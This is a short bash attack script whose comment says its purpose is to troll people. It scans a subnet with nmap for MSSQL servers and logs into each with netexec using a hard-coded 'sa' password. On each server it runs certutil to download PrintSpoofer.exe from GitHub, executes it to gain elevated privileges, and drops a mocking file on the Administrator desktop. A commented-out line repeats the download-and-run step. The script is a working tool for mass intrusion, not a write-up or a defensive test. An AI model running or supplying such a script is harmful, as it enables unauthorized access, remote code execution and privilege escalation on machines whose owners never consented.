#!/bin/bash
# Author: Danilo Nascimento

# troll people by creating a file in the C:\ 

# To create a list of vulnerable IPs:
# sudo nmap --open -p1433 10.10.0.0/24 | grep 10.10.0 | awk '{print $NF}' > ipMSSQL.txt
# then run:

sudo nmap --open -p1433 10.10.0.0/24 | grep 10.10.0 | awk '{print $NF}'| sort -u > ipMSSQL.txt &&

for IP in $(cat ipMSSQL.txt); do 
    netexec mssql $IP -u 'sa' -p 'Pass@123' -x 'certutil.exe -urlcache -split -f https://github.com/k4sth4/PrintSpoofer/raw/main/PrintSpoofer.exe C:\Windows\tasks\Printspoofer.exe && C:\Windows\tasks\Printspoofer.exe -c "powershell.exe -c echo > C:\Users\Administrator\Desktop\HELLO_MY_FRIEND_JustTrollinYouByDanilo.txt" && dir C:\' --local-auth
    # echo "$IP\n" # debug
    # If we compile the PrintSpoofer with the create file command...
    # netexec mssql $IP -u 'sa' -p 'Pass@123' -x 'certutil.exe -urlcache -split -f https://github.com/k4sth4/PrintSpoofer/raw/main/PrintSpoofer.exe C:\Windows\tasks\PrintSpooferTROLLL.exe && C:\Windows\tasks\PrintSpooferTROLLL.exe'
done


